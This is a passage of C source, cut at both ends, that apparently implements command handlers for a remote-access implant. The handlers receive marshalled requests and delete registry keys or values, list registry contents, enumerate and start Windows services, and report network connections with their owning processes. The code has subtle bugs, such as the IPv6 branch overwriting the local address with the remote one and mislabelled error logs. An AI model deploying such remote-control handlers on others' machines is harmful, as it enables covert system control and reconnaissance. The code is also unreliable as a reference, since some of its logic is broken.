		goto CLEANUP;
	}

	RegCloseKey(hKey);
	Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_WRITE, &hKey);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegOpenKeyExA", Status);
		goto CLEANUP;
	}

	if (lpValueName == NULL) {
		Status = RegDeleteKeyA(hKey, lpKeyName);
		if (Status != ERROR_SUCCESS) {
			LOG_ERROR("RegDeleteKeyA", Status);
			goto CLEANUP;
		}
	}
	else {
		Status = RegDeleteValueA(hKey, lpValueName);
		if (Status != ERROR_SUCCESS) {
			LOG_ERROR("RegDeleteValueA", Status);
			goto CLEANUP;
		}
	}

	pFinalElement = CreateStructElement(NULL, 0, 9);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (UnmarshalledData != NULL) {
		for (i = 0; i < _countof(RecvElementList); i++) {
			FreeBuffer(UnmarshalledData[i]);
		}

		FREE(UnmarshalledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	if (lpHive != NULL) {
		FREE(lpHive);
	}

	if (lpValueName != NULL) {
		FREE(lpValueName);
	}

	if (lpKeyName != NULL) {
		FREE(lpKeyName);
	}

	if (lpTemp != NULL) {
		FREE(lpTemp);
	}

	FreeElement(pFinalElement);

	return pRespEnvelope;
}

PENVELOPE RegistrySubKeysListHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	PPBElement RecvElementList[2];
	PBUFFER* pSubKeys = NULL;
	DWORD i = 0;
	PBUFFER* UnmarshalledData = NULL;
	LPSTR lpHive = NULL;
	LPSTR lpPath = NULL;
	HKEY hRootKey = NULL;
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;
	PPBElement pFinalElement = NULL;
	DWORD cSubKeys = 0;
	DWORD dwMaxSubKeyLength = 0;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshalledData[0] == NULL || UnmarshalledData[1] == NULL) {
		goto CLEANUP;
	}

	lpHive = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
	lpPath = DuplicateStrA(UnmarshalledData[1]->pBuffer, 0);
	if (!lstrcmpA(lpHive, "HKCR")) {
		hRootKey = HKEY_CLASSES_ROOT;
	}
	else if (!lstrcmpA(lpHive, "HKCU")) {
		hRootKey = HKEY_CURRENT_USER;
	}
	else if (!lstrcmpA(lpHive, "HKLM")) {
		hRootKey = HKEY_LOCAL_MACHINE;
	}
	else if (!lstrcmpA(lpHive, "HKPD")) {
		hRootKey = HKEY_PERFORMANCE_DATA;
	}
	else if (!lstrcmpA(lpHive, "HKU")) {
		hRootKey = HKEY_USERS;
	}
	else if (!lstrcmpA(lpHive, "HKCC")) {
		hRootKey = HKEY_CURRENT_CONFIG;
	}
	else {
		goto CLEANUP;
	}

	Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_READ, &hKey);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegOpenKeyExA", Status);
		goto CLEANUP;
	}

	Status = RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &cSubKeys, &dwMaxSubKeyLength, NULL, NULL, NULL, NULL, NULL, NULL);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegQueryInfoKeyA", Status);
		goto CLEANUP;
	}

	pSubKeys = ALLOC(sizeof(PBUFFER) * cSubKeys);
	for (i = 0; i < cSubKeys; i++) {
		pSubKeys[i] = ALLOC(sizeof(BUFFER));
		pSubKeys[i]->cbBuffer = dwMaxSubKeyLength + 1;
		pSubKeys[i]->pBuffer = ALLOC(pSubKeys[i]->cbBuffer);
		Status = RegEnumKeyExA(hKey, i, pSubKeys[i]->pBuffer, &pSubKeys[i]->cbBuffer, NULL, NULL, NULL, NULL);
		if (Status == ERROR_MORE_DATA) {
			pSubKeys[i]->cbBuffer += 1;
			pSubKeys[i]->pBuffer = REALLOC(pSubKeys[i]->pBuffer, pSubKeys[i]->cbBuffer);
			Status = RegEnumKeyExA(hKey, i, pSubKeys[i]->pBuffer, &pSubKeys[i]->cbBuffer, NULL, NULL, NULL, NULL);
			if (Status != ERROR_SUCCESS) {
				LOG_ERROR("RegEnumKeyExA", Status);
				goto CLEANUP;
			}
		}
		else if (Status == ERROR_NO_MORE_ITEMS) {
			break;
		}
		else if (Status != ERROR_SUCCESS) {
			LOG_ERROR("RegEnumKeyExA", Status);
			goto CLEANUP;
		}

		pSubKeys[i]->cbBuffer = lstrlenA(pSubKeys[i]->pBuffer);
	}

	pFinalElement = CreateRepeatedBytesElement(pSubKeys, i, 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (UnmarshalledData != NULL) {
		for (i = 0; i < _countof(RecvElementList); i++) {
			FreeBuffer(UnmarshalledData[i]);
		}

		FREE(UnmarshalledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	if (lpHive != NULL) {
		FREE(lpHive);
	}

	if (pSubKeys != NULL) {
		for (i = 0; i < cSubKeys; i++) {
			FreeBuffer(pSubKeys[i]);
		}

		FREE(pSubKeys);
	}

	FreeElement(pFinalElement);

	return pRespEnvelope;
}

PENVELOPE RegistryListValuesHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	PPBElement RecvElementList[2];
	PBUFFER* pValues = NULL;
	DWORD i = 0;
	PBUFFER* UnmarshalledData = NULL;
	LPSTR lpHive = NULL;
	LPSTR lpPath = NULL;
	HKEY hRootKey = NULL;
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;
	PPBElement pFinalElement = NULL;
	DWORD cValues = 0;
	DWORD dwMaxValueNameLength = 0;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshalledData[0] == NULL || UnmarshalledData[1] == NULL) {
		goto CLEANUP;
	}

	lpHive = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
	lpPath = DuplicateStrA(UnmarshalledData[1]->pBuffer, 0);
	if (!lstrcmpA(lpHive, "HKCR")) {
		hRootKey = HKEY_CLASSES_ROOT;
	}
	else if (!lstrcmpA(lpHive, "HKCU")) {
		hRootKey = HKEY_CURRENT_USER;
	}
	else if (!lstrcmpA(lpHive, "HKLM")) {
		hRootKey = HKEY_LOCAL_MACHINE;
	}
	else if (!lstrcmpA(lpHive, "HKPD")) {
		hRootKey = HKEY_PERFORMANCE_DATA;
	}
	else if (!lstrcmpA(lpHive, "HKU")) {
		hRootKey = HKEY_USERS;
	}
	else if (!lstrcmpA(lpHive, "HKCC")) {
		hRootKey = HKEY_CURRENT_CONFIG;
	}
	else {
		goto CLEANUP;
	}

	Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_READ, &hKey);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegOpenKeyExA", Status);
		goto CLEANUP;
	}

	Status = RegQueryInfoKeyA(hKey, NULL, NULL, NULL, NULL, NULL, NULL, &cValues, &dwMaxValueNameLength, NULL, NULL, NULL);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegQueryInfoKeyA", Status);
		goto CLEANUP;
	}

	pValues = ALLOC(sizeof(PBUFFER) * cValues);
	for (i = 0; i < cValues; i++) {
		pValues[i] = ALLOC(sizeof(BUFFER));
		pValues[i]->cbBuffer = dwMaxValueNameLength + 1;
		pValues[i]->pBuffer = ALLOC(pValues[i]->cbBuffer);
		Status = RegEnumValueA(hKey, i, pValues[i]->pBuffer, &pValues[i]->cbBuffer, NULL, NULL, NULL, NULL);
		if (Status == ERROR_MORE_DATA) {
			pValues[i]->cbBuffer += 1;
			pValues[i]->pBuffer = REALLOC(pValues[i]->pBuffer, pValues[i]->cbBuffer);
			Status = RegEnumValueA(hKey, i, pValues[i]->pBuffer, &pValues[i]->cbBuffer, NULL, NULL, NULL, NULL);
			if (Status != ERROR_SUCCESS) {
				LOG_ERROR("RegEnumKeyExA", Status);
				goto CLEANUP;
			}
		}
		else if (Status == ERROR_NO_MORE_ITEMS) {
			break;
		}
		else if (Status != ERROR_SUCCESS) {
			LOG_ERROR("RegEnumKeyExA", Status);
			goto CLEANUP;
		}

		pValues[i]->cbBuffer = lstrlenA(pValues[i]->pBuffer);
	}

	pFinalElement = CreateRepeatedBytesElement(pValues, i, 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (UnmarshalledData != NULL) {
		for (i = 0; i < _countof(RecvElementList); i++) {
			FreeBuffer(UnmarshalledData[i]);
		}

		FREE(UnmarshalledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	if (lpHive != NULL) {
		FREE(lpHive);
	}

	if (pValues != NULL) {
		for (i = 0; i < cValues; i++) {
			FreeBuffer(pValues[i]);
		}

		FREE(pValues);
	}

	FreeElement(pFinalElement);

	return pRespEnvelope;
}

PENVELOPE ServicesHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	LPENUM_SERVICE_STATUS_PROCESSA Services = NULL;
	LPENUM_SERVICE_STATUS_PROCESSA pService = NULL;
	PPBElement ServiceDetails[7];
	PPBElement pFinalElement = NULL;
	PPBElement* ServiceList = NULL;
	DWORD dwNumberOfServices = 0;
	SC_HANDLE hService = NULL;
	DWORD i = 0;
	SC_HANDLE hScManager = NULL;
	LPQUERY_SERVICE_CONFIGA pServiceConfig = NULL;
	DWORD dwBytesNeeded = 0;
	LPSERVICE_DESCRIPTIONA lpServiceDesc = NULL;

	Services = EnumServices(&dwNumberOfServices);
	if (Services == NULL || dwNumberOfServices == 0) {
		goto CLEANUP;
	}

	hScManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
	if (hScManager == NULL) {
		LOG_ERROR("OpenSCManagerA", GetLastError());
		goto CLEANUP;
	}

	ServiceList = ALLOC(sizeof(PPBElement) * dwNumberOfServices);
	for (i = 0; i < dwNumberOfServices; i++) {
		pService = &Services[i];
		ServiceDetails[0] = CreateBytesElement(pService->lpServiceName, lstrlenA(pService->lpServiceName), 1);
		ServiceDetails[1] = CreateBytesElement(pService->lpDisplayName, lstrlenA(pService->lpDisplayName), 2);
		ServiceDetails[3] = CreateVarIntElement(pService->ServiceStatusProcess.dwCurrentState, 4);
		hService = OpenServiceA(hScManager, pService->lpServiceName, SERVICE_QUERY_CONFIG | SERVICE_QUERY_STATUS);
		if (hService != NULL) {
			QueryServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, NULL, 0, &dwBytesNeeded);
			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
				lpServiceDesc = ALLOC(dwBytesNeeded + 1);
				if (QueryServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, lpServiceDesc, dwBytesNeeded, &dwBytesNeeded)) {
					ServiceDetails[2] = CreateBytesElement(lpServiceDesc->lpDescription, lstrlenA(lpServiceDesc->lpDescription), 3);
				}

				FREE(lpServiceDesc);
			}

			QueryServiceConfigA(hService, NULL, 0, &dwBytesNeeded);
			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
				pServiceConfig = ALLOC(dwBytesNeeded + 1);
				if (QueryServiceConfigA(hService, pServiceConfig, dwBytesNeeded, &dwBytesNeeded)) {
					ServiceDetails[4] = CreateVarIntElement(pServiceConfig->dwStartType, 5);
					ServiceDetails[5] = CreateBytesElement(pServiceConfig->lpBinaryPathName, lstrlenA(pServiceConfig->lpBinaryPathName), 6);
					ServiceDetails[6] = CreateBytesElement(pServiceConfig->lpServiceStartName, lstrlenA(pServiceConfig->lpServiceStartName), 7);
				}

				FREE(pServiceConfig);
			}

			CloseServiceHandle(hService);
		}

		ServiceList[i] = CreateStructElement(ServiceDetails, _countof(ServiceDetails), 0);
	}

	pFinalElement = CreateRepeatedStructElement(ServiceList, dwNumberOfServices, 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;

CLEANUP:
	if (hScManager != NULL) {
		CloseServiceHandle(hScManager);
	}

	if (Services != NULL) {
		FREE(Services);
	}

	if (ServiceList != NULL) {
		FREE(ServiceList);
	}

	FreeElement(pFinalElement);

	return pRespEnvelope;
}

PENVELOPE ServiceDetailHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	PPBElement ServiceDetails[7];
	PPBElement pFinalElement = NULL;
	PBUFFER** pServiceInfoReq = NULL;
	PPBElement pRecvElement;
	SC_HANDLE hService = NULL;
	DWORD i = 0;
	SC_HANDLE hScManager = NULL;
	LPQUERY_SERVICE_CONFIGA pServiceConfig = NULL;
	DWORD dwBytesNeeded = 0;
	LPSERVICE_DESCRIPTIONA lpServiceDesc = NULL;
	PPBElement RecvElementList[2];
	LPSTR lpServiceName = NULL;
	DWORD cchServiceDisplayName = 0;
	LPSTR lpServiceDisplayName = NULL;
	SERVICE_STATUS ServiceStatus;

	pRecvElement = ALLOC(sizeof(PBElement));
	pRecvElement->Type = StructType;
	pRecvElement->dwFieldIdx = 1;
	pRecvElement->SubElements = ALLOC(sizeof(PPBElement) * 2);
	pRecvElement->dwNumberOfSubElement = 2;
	for (i = 0; i < pRecvElement->dwNumberOfSubElement; i++) {
		pRecvElement->SubElements[i] = ALLOC(sizeof(PBElement));
		pRecvElement->SubElements[i]->Type = Bytes;
		pRecvElement->SubElements[i]->dwFieldIdx = i + 1;
	}

	pServiceInfoReq = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	lpServiceName = DuplicateStrA(pServiceInfoReq[0][0]->pBuffer, 0);
	hScManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
	if (hScManager == NULL) {
		LOG_ERROR("OpenSCManagerA", GetLastError());
		goto CLEANUP;
	}

	hService = OpenServiceA(hScManager, lpServiceName, SERVICE_QUERY_CONFIG | SERVICE_QUERY_STATUS);
	if (hService == NULL) {
		LOG_ERROR("OpenServiceA", GetLastError());
		goto CLEANUP;
	}

	ServiceDetails[0] = CreateBytesElement(lpServiceName, lstrlenA(lpServiceName), 1);
	GetServiceDisplayNameA(hScManager, lpServiceName, NULL, &cchServiceDisplayName);
	cchServiceDisplayName++;
	lpServiceDisplayName = ALLOC(cchServiceDisplayName);
	if (!GetServiceDisplayNameA(hScManager, lpServiceName, lpServiceDisplayName, &cchServiceDisplayName)) {
		LOG_ERROR("GetServiceDisplayNameA", GetLastError());
		goto CLEANUP;
	}

	ServiceDetails[1] = CreateBytesElement(lpServiceDisplayName, lstrlenA(lpServiceDisplayName), 2);
	QueryServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, NULL, 0, &dwBytesNeeded);
	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
		lpServiceDesc = ALLOC(dwBytesNeeded + 1);
		if (QueryServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, lpServiceDesc, dwBytesNeeded, &dwBytesNeeded)) {
			ServiceDetails[2] = CreateBytesElement(lpServiceDesc->lpDescription, lstrlenA(lpServiceDesc->lpDescription), 3);
		}
	}

	SecureZeroMemory(&ServiceStatus, sizeof(ServiceStatus));
	if (!QueryServiceStatus(hService, &ServiceStatus)) {
		LOG_ERROR("QueryServiceStatus", GetLastError());
		goto CLEANUP;
	}

	ServiceDetails[3] = CreateVarIntElement(ServiceStatus.dwCurrentState, 4);
	QueryServiceConfigA(hService, NULL, 0, &dwBytesNeeded);
	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
		pServiceConfig = ALLOC(dwBytesNeeded + 1);
		if (QueryServiceConfigA(hService, pServiceConfig, dwBytesNeeded, &dwBytesNeeded)) {
			ServiceDetails[4] = CreateVarIntElement(pServiceConfig->dwStartType, 5);
			ServiceDetails[5] = CreateBytesElement(pServiceConfig->lpBinaryPathName, lstrlenA(pServiceConfig->lpBinaryPathName), 6);
			ServiceDetails[6] = CreateBytesElement(pServiceConfig->lpServiceStartName, lstrlenA(pServiceConfig->lpServiceStartName), 7);
		}
	}

	pFinalElement = CreateStructElement(ServiceDetails, _countof(ServiceDetails), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;

CLEANUP:
	if (lpServiceName != NULL) {
		FREE(lpServiceName);
	}

	FreeElement(pRecvElement);
	if (pServiceInfoReq != NULL) {
		FreeBuffer(pServiceInfoReq[0][0]);
		FreeBuffer(pServiceInfoReq[0][1]);
		FREE(pServiceInfoReq[0]);
		FREE(pServiceInfoReq);
	}

	if (lpServiceDesc != NULL) {
		FREE(lpServiceDesc);
	}

	if (pServiceConfig != NULL) {
		FREE(pServiceConfig);
	}

	if (hScManager != NULL) {
		CloseServiceHandle(hScManager);
	}

	if (lpServiceDisplayName != NULL) {
		FREE(lpServiceDisplayName);
	}

	if (hService != NULL) {
		CloseServiceHandle(hService);
	}

	FreeElement(pFinalElement);

	return pRespEnvelope;
}

PENVELOPE StartServiceByNameHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	PBUFFER** pServiceInfoReq = NULL;
	PPBElement pRecvElement;
	SC_HANDLE hService = NULL;
	DWORD i = 0;
	SC_HANDLE hScManager = NULL;
	DWORD dwBytesNeeded = 0;
	PPBElement RecvElementList[2];
	LPSTR lpServiceName = NULL;

	pRecvElement = ALLOC(sizeof(PBElement));
	pRecvElement->Type = StructType;
	pRecvElement->dwFieldIdx = 1;
	pRecvElement->SubElements = ALLOC(sizeof(PPBElement) * 2);
	pRecvElement->dwNumberOfSubElement = 2;
	for (i = 0; i < pRecvElement->dwNumberOfSubElement; i++) {
		pRecvElement->SubElements[i] = ALLOC(sizeof(PBElement));
		pRecvElement->SubElements[i]->Type = Bytes;
		pRecvElement->SubElements[i]->dwFieldIdx = i + 1;
	}

	pServiceInfoReq = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	lpServiceName = DuplicateStrA(pServiceInfoReq[0][0]->pBuffer, 0);
	hScManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
	if (hScManager == NULL) {
		LOG_ERROR("OpenSCManagerA", GetLastError());
		goto CLEANUP;
	}

	hService = OpenServiceA(hScManager, lpServiceName, SERVICE_START);
	if (hService == NULL) {
		LOG_ERROR("OpenServiceA", GetLastError());
		goto CLEANUP;
	}

	if (!StartServiceA(hService, 0, NULL)) {
		LOG_ERROR("StartServiceA", GetLastError());
		goto CLEANUP;
	}

	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
CLEANUP:
	if (lpServiceName != NULL) {
		FREE(lpServiceName);
	}

	FreeElement(pRecvElement);
	if (pServiceInfoReq != NULL) {
		FreeBuffer(pServiceInfoReq[0][0]);
		FreeBuffer(pServiceInfoReq[0][1]);
		FREE(pServiceInfoReq[0]);
		FREE(pServiceInfoReq);
	}

	if (hScManager != NULL) {
		CloseServiceHandle(hScManager);
	}

	if (hService != NULL) {
		CloseServiceHandle(hService);
	}

	return pRespEnvelope;
}

PENVELOPE NetstatHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement RecvElementList[5];
	PPBElement SockTabEntry[6];
	PPBElement ProcessElement[2];
	PPBElement SockAddress[2];
	PPBElement pFinalElement = NULL;
	PPBElement* SockTabList = NULL;
	DWORD i = 0;
	DWORD dwNumberOfBytesRead = 0;
	PUINT64 pTemp = NULL;
	PENVELOPE pRespEnvelope = NULL;
	DWORD dwReturnedLength = 0;
	BOOL Tcp = FALSE;
	BOOL Udp = FALSE;
	BOOL Ipv4 = FALSE;
	BOOL Ipv6 = FALSE;
	BOOL Listening = FALSE;
	PNETWORK_CONNECTION pNetState = NULL;
	PNETWORK_CONNECTION pConnection = NULL;
	DWORD dwNumberOfConnections = 0;
	DWORD dwAddressType = 0;
	LPSTR lpStateStr = NULL;
	HANDLE hProc = NULL;
	LPSTR lpProcessPath = NULL;
	LPSTR lpProcessImageName = NULL;
	LPWSTR lpIpAddress = NULL;
	DWORD cchIpAddress = 0;
	LPSTR lpTemp = NULL;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Varint;
	}

	pTemp = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, &dwNumberOfBytesRead);
	Tcp = (BOOL)pTemp[0];
	Udp = (BOOL)pTemp[1];
	Ipv4 = (BOOL)pTemp[2];
	Ipv6 = (BOOL)pTemp[3];
	Listening = (BOOL)pTemp[4];

	pNetState = GetNetworkConnections(&dwNumberOfConnections);
	SockTabList = ALLOC(sizeof(PPBElement) * dwNumberOfConnections);
	for (i = 0; i < dwNumberOfConnections; i++) {
		pConnection = &pNetState[i];
		SecureZeroMemory(&SockTabEntry, sizeof(SockTabEntry));
		SecureZeroMemory(&ProcessElement, sizeof(ProcessElement));
		SecureZeroMemory(&SockAddress, sizeof(SockAddress));
		if (!Tcp && (pConnection->uProtocolType & TCP_PROTOCOL_TYPE)) {
			continue;
		}

		if (!Udp && (pConnection->uProtocolType & UDP_PROTOCOL_TYPE)) {
			continue;
		}

		dwAddressType = pConnection->LocalEndpoint.Address.Type;
		if (!Ipv4 && (dwAddressType == IPV4_NETWORK_TYPE)) {
			continue;
		}

		if (!Ipv6 && (dwAddressType == IPV6_NETWORK_TYPE)) {
			continue;
		}

		if ((pConnection->uProtocolType & TCP_PROTOCOL_TYPE) && Listening && pConnection->State != MIB_TCP_STATE_LISTEN) {
			continue;
		}

		if (pConnection->uProtocolType & TCP_PROTOCOL_TYPE) {
			if (pConnection->State == MIB_TCP_STATE_CLOSED) {
				lpStateStr = DuplicateStrA("Closed", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_LISTEN) {
				lpStateStr = DuplicateStrA("Listen", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_SYN_SENT) {
				lpStateStr = DuplicateStrA("SYN sent", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_SYN_RCVD) {
				lpStateStr = DuplicateStrA("SYN received", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_ESTAB) {
				lpStateStr = DuplicateStrA("Established", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_FIN_WAIT1) {
				lpStateStr = DuplicateStrA("FIN wait 1", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_FIN_WAIT2) {
				lpStateStr = DuplicateStrA("FIN wait 2", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_CLOSE_WAIT) {
				lpStateStr = DuplicateStrA("Close wait", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_CLOSING) {
				lpStateStr = DuplicateStrA("Closing", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_LAST_ACK) {
				lpStateStr = DuplicateStrA("Last ACK", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_TIME_WAIT) {
				lpStateStr = DuplicateStrA("Time wait", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_DELETE_TCB) {
				lpStateStr = DuplicateStrA("Delete TCB", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_RESERVED) {
				lpStateStr = DuplicateStrA("Bound", 0);
			}
			else {
				lpStateStr = DuplicateStrA("Unknown", 0);
			}

			SockTabEntry[2] = CreateBytesElement(lpStateStr, lstrlenA(lpStateStr), 3);
			FREE(lpStateStr);
		}

		hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pConnection->ProcessId);
		if (hProc != NULL) {
			lpProcessPath = GetProcessImageFileNameWin32(hProc);
			lpProcessImageName = PathFindFileNameA(lpProcessPath);
			ProcessElement[0] = CreateVarIntElement((UINT64)pConnection->ProcessId, 4);
			ProcessElement[1] = CreateBytesElement(lpProcessImageName, lstrlenA(lpProcessImageName), 13);
			CloseHandle(hProc);
			FREE(lpProcessPath);
			SockTabEntry[4] = CreateStructElement(ProcessElement, _countof(ProcessElement), 5);
		}

		if (pConnection->uProtocolType & TCP_PROTOCOL_TYPE) {
			SockTabEntry[5] = CreateBytesElement("tcp", 3, 6);
		}
		else {
			SockTabEntry[5] = CreateBytesElement("udp", 3, 6);
		}

		if (dwAddressType == IPV4_NETWORK_TYPE) {
			cchIpAddress = INET_ADDRSTRLEN + 1;
			lpIpAddress = ALLOC(cchIpAddress * sizeof(WCHAR));
			RtlIpv4AddressToStringExW(&pConnection->LocalEndpoint.Address.InAddr, 0, lpIpAddress, &cchIpAddress);
			lpTemp = ConvertWcharToChar(lpIpAddress);
			SockAddress[0] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 1);
			SockAddress[1] = CreateVarIntElement(pConnection->LocalEndpoint.Port, 2);
			SockTabEntry[0] = CreateStructElement(SockAddress, _countof(SockAddress), 1);
			FREE(lpTemp);
			FREE(lpIpAddress);

			cchIpAddress = INET_ADDRSTRLEN + 1;
			lpIpAddress = ALLOC(cchIpAddress * sizeof(WCHAR));
			RtlIpv4AddressToStringExW(&pConnection->RemoteEndpoint.Address.InAddr, 0, lpIpAddress, &cchIpAddress);
			lpTemp = ConvertWcharToChar(lpIpAddress);
			SockAddress[0] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 1);
			SockAddress[1] = CreateVarIntElement(pConnection->RemoteEndpoint.Port, 2);
			SockTabEntry[1] = CreateStructElement(SockAddress, _countof(SockAddress), 2);
			FREE(lpTemp);
			FREE(lpIpAddress);
		}
		else {
			cchIpAddress = INET6_ADDRSTRLEN + 1;
			lpIpAddress = ALLOC(cchIpAddress * sizeof(WCHAR));
			RtlIpv6AddressToStringExW(&pConnection->LocalEndpoint.Address.InAddr, 0, 0, lpIpAddress, &cchIpAddress);
			lpTemp = ConvertWcharToChar(lpIpAddress);
			SockAddress[0] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 1);
			SockAddress[1] = CreateVarIntElement(pConnection->LocalEndpoint.Port, 2);
			SockTabEntry[1] = CreateStructElement(SockAddress, _countof(SockAddress), 2);
			FREE(lpTemp);
			FREE(lpIpAddress);

			cchIpAddress = INET6_ADDRSTRLEN + 1;
			lpIpAddress = ALLOC(cchIpAddress * sizeof(WCHAR));
			RtlIpv6AddressToStringExW(&pConnection->RemoteEndpoint.Address.InAddr, 0, 0, lpIpAddress, &cchIpAddress);
			lpTemp = ConvertWcharToChar(lpIpAddress);
			SockAddress[0] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 1);
			SockAddress[1] = CreateVarIntElement(pConnection->RemoteEndpoint.Port, 2);
			SockTabEntry[1] = CreateStructElement(SockAddress, _countof(SockAddress), 2);
			FREE(lpTemp);
			FREE(lpIpAddress);
		}

